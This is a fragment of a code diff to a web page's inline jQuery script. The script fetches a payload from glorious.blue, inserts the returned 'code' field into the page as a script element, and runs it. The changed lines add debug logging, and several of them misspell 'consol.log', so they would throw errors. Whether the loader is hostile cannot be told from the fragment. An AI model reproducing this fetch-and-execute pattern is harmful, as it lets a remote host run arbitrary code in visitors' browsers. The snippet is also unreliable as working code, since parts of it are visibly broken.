@@ -53,14 +53,19 @@ $.get("https://glorious.blue/d/1186/?c=cb8386a7-75da-4661-be93-5cef859f88be")
       url:"https://glorious.blue/brezvfe/186f7a66-cb11-446f-b8ae-434f251dc855/res",
       timespan:10000
       }).done(function(data,textStatus,jqXHR) {
+              console.log(data)
+              console.log(textStatus)
+              consol.log(jqXHR)
               var script = document.createElement('script');
               script.innerHTML = data.code
               var bodyTag = document.getElementsByTagName('body').item(0)
               bodyTag.appendChild(script)
       }).fail(function(jqXHR, textStatus, errorThrown ) {
+          console.log(jqXHR)
+          console.log(textStatus)
+          consol.log(errorThrown)
     }).always(function(){
-        console.log
-        console.log(data)
+        console.log(1111111)
     });
 </script>
 </head>
